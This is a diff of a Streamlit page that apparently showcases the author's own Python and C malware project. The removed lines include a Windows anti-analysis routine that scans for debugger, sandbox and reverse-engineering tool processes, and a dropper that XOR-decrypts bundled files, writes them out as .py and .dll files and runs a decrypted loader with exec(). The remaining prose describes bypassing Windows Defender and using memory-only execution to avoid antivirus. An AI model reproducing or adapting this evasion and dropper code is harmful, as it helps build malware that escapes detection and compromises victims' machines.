@@ -141,6 +141,10 @@ def page_2():
     - [Complementary Sources](#complementary-sources)
         """, unsafe_allow_html=True)
 
+    st.info("""
+            
+            
+            """)
     
     st.markdown("<br> <br>", unsafe_allow_html=True)
     st.write("""
@@ -467,91 +471,6 @@ class Info_screen:
     
     
     syscall_evasion_code =r"""
-#include <windows.h>
-#include <stdio.h>
-
-typedef LONG NTSTATUS;
-#define SystemProcessInformation 5
-#define SystemBasicInformation 0
-
-typedef struct _SYSTEM_BASIC_INFORMATION {
-   ULONG Reserved;
-   ULONG TimerResolution;
-   ULONG PageSize;
-   ULONG NumberOfPhysicalPages;
-   ULONG LowestPhysicalPageNumber;
-   ULONG HighestPhysicalPageNumber;
-   ULONG AllocationGranularity;
-   ULONG MinimumUserModeAddress;
-   ULONG MaximumUserModeAddress;
-   ULONG ActiveProcessorsAffinityMask;
-   UCHAR NumberOfProcessors;
-   UCHAR _pad1[3];
-} SYSTEM_BASIC_INFORMATION;
-
-typedef struct _UNICODE_STRING {
-      USHORT Length;
-      USHORT MaximumLength;
-      PWSTR  Buffer;
-} UNICODE_STRING, *PCUNICODE_STRING;
-
-typedef struct _VM_COUNTERS {
-      SIZE_T 	PeakVirtualSize;
-      SIZE_T 	VirtualSize;
-      ULONG 	PageFaultCount; 
-      SIZE_T 	PeakWorkingSetSize;
-      SIZE_T 	WorkingSetSize;
-      SIZE_T 	QuotaPeakPagedPoolUsage;
-      SIZE_T 	QuotaPagedPoolUsage;
-      SIZE_T 	QuotaPeakNonPagedPoolUsage;
-      SIZE_T 	QuotaNonPagedPoolUsage;
-      SIZE_T 	PagefileUsage;
-      SIZE_T 	PeakPagefileUsage;
-      SIZE_T 	PrivatePageCount;
-} VM_COUNTERS;
-
-typedef LONG KPRIORITY;
-
-typedef struct _CLIENT_ID
-{
-     PVOID UniqueProcess;
-     PVOID UniqueThread;
-} CLIENT_ID, *PCLIENT_ID;
-
-typedef struct _SYSTEM_THREAD_INFORMATION {
-    LARGE_INTEGER   KernelTime;
-    LARGE_INTEGER   UserTime;
-    LARGE_INTEGER   CreateTime;
-    ULONG           WaitTime;
-    PVOID           StartAddress;
-    CLIENT_ID       ClientId;         
-    KPRIORITY       Priority;
-    KPRIORITY       BasePriority;
-    ULONG           ContextSwitches;
-    ULONG           ThreadState;
-    ULONG           WaitReason;
-} SYSTEM_THREAD, *PSYSTEM_THREAD_INFORMATION;
-
-
-typedef struct _SYSTEM_PROCESS_INFORMATION {
-      ULONG                   NextEntryOffset;
-      ULONG                   NumberOfThreads;
-      LARGE_INTEGER           Reserved[3];
-      LARGE_INTEGER           CreateTime;
-      LARGE_INTEGER           UserTime;
-      LARGE_INTEGER           KernelTime;
-      UNICODE_STRING          ImageName;
-      KPRIORITY               BasePriority;
-      HANDLE                  ProcessId;
-      HANDLE                  InheritedFromProcessId;
-      ULONG                   HandleCount;
-      ULONG                   Reserved2[2];
-      ULONG                   PrivatePageCount;
-      VM_COUNTERS             VirtualMemoryCounters;
-      IO_COUNTERS             IoCounters;
-} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;
-
-
 int main() {
     // Pour afficher les caractères Unicode
     SetConsoleOutputCP(CP_UTF8);
@@ -562,12 +481,6 @@ int main() {
         return 1;
     }
 
-    typedef NTSTATUS (WINAPI *NtQuerySystemInformation_t)(
-        ULONG SystemInformationClass,
-        PVOID SystemInformation,
-        ULONG SystemInformationLength,
-        PULONG ReturnLength
-    );
 
     NtQuerySystemInformation_t NtQuerySystemInformation =
         (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");
@@ -598,44 +511,7 @@ int main() {
     const wchar_t* list_tools_analysis[] = {
         L"ida.exe",            
         L"ida64.exe",           
-        L"ghidraRun.exe",       
-        L"radare2.exe",        
-        L"binaryninja.exe",     
-        L"cutter.exe",        
-        L"pe-bear.exe",        
-        L"x64dbg.exe",        
-        L"x32dbg.exe",         
-        L"windbg.exe",         
-        L"ollydbg.exe",        
-        L"ImmunityDebugger.exe",
-        L"cuckoo.exe",         
-        L"agent.py",            
-        L"anyrun-agent.exe",    
-        L"joeboxcontrol.exe",  
-        L"joeboxserver.exe",
-        L"hybrid-analysis.exe", 
-        L"malwr.exe",          
-        L"procmon.exe",         
-        L"procexp.exe",         
-        L"tcpview.exe",         
-        L"autoruns.exe",         
-        L"regshot.exe",          
-        L"wireshark.exe",     
-        L"fakenet.exe",         
-        L"fakenet-ng.exe",       
-        L"upx.exe",            
-        L"die.exe",             
-        L"exeinfope.exe",        
-        L"volatility.exe",       
-        L"rekall.exe",         
-        L"cape.exe",           
-        L"yara64.exe",          
-        L"yara32.exe",        
-        L"vt.exe",              
-        L"virustotaluploader.exe",  
-        L"intezer_analyze.exe",      
-        L"flarevm_launcher.bat",    
-        L"remnux.exe",               
+        L"ghidraRun.exe",                      
         NULL
     };
     
@@ -911,87 +787,15 @@ Key.cmdKey.tabjhgjygyjgjKey.esc
     
     :green[Four: TECHNIQUE IMPORT:]
     
-    To import module, i used importlib. He will import library dynamically, so during the code execution. You will see how it works below 
-    with the dropper code. 
-    
-    :blue[Of course, the technic used previously in order to bypass dynamic analysis helped a lot. The mixe of all theses technics 
-    make the python malware, capable to bypass a Windows Defender at home.]
-    
+    To import module, i used importlib. He will import library dynamically, so during the code execution. You can see how it works
+    with the dropper code in the GitHub page !
              """)
     
-    code_dropper ="""
-    from pathlib import Path
-    import importlib
-    import tempfile
-
-
-    misterio = ['o'+'s','sy'+'s']
-    o = importlib.import_module(misterio[0])
-    sss = importlib.import_module(misterio[1])
-
-    import os, sys
-
-    def get_data_path(filename):
-        if getattr(sys, 'frozen', False):
-            return os.path.join(sys._MEIPASS, filename)
-        return os.path.join(os.path.abspath("."), filename)
-
-
-    def xor_dec(data: bytes, key: bytes) -> bytes:
-        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
-
-    yek = 'SHAD0WKEY'.encode()
-    temp_path = get_data_path(tempfile.gettempdir())
-
-    repertoire = Path(get_data_path("game_saved"))
-
-
-    for fichier in repertoire.iterdir():
-        
-        if ".xor" in fichier.name:
-            
-            with open(fichier, "rb") as f:
-                encrypted = f.read()
-                decrypted = xor_dec(encrypted, yek)
-                
-                    
-            file_name_nom = fichier.name.replace(".xor", ".py")
-            chemin_sortie = Path(temp_path) / file_name_nom
-            
-            with open(chemin_sortie, "wb") as out:
-                out.write(decrypted)
-                
-    call_path = get_data_path("danse_with_me.xor")   
-            
-    with open(call_path, "rb") as f:
-        
-                encrypted = f.read()
-                
-                decrypted = xor_dec(encrypted, yek)
-                
-    file_name_nom = call_path.replace(".xor", ".dll")
-
-    chemin_sortie = get_data_path(Path(".") / file_name_nom)
-
-    with open(chemin_sortie, "wb") as out:
-        out.write(decrypted)            
-                
-    loader = get_data_path("rename_game.xor")
-
-    with open(loader, "rb") as f:
-            encrypted = f.read()
-            
-    decrypted = xor_dec(encrypted, yek)
-
-    exec(decrypted.decode("utf-8"))
-    """
-    st.code(code_dropper, language="python")    
-
     st.write("""
         :green[Five: Flash-Memory Execution:]
     
     The malware run other file directly in the dropper. In other world, it will not use processor during the captation of information (but it 
-    will use it during the sending AND at the beginning of the programm). 
+    will use it during the sending AND at the beginning of the program). 
     An antivirus play around the processor execution so using flash-memory and fileless (not in this case) programm it become more simple
     to bypass protection. Malware today don't even use C/Python or other language to drop processus but for exemple native windows language like
     Powershell. Fileless malware are more performant and using native language keep them close to WinAPI without suspicion. But this work against Antivirus,
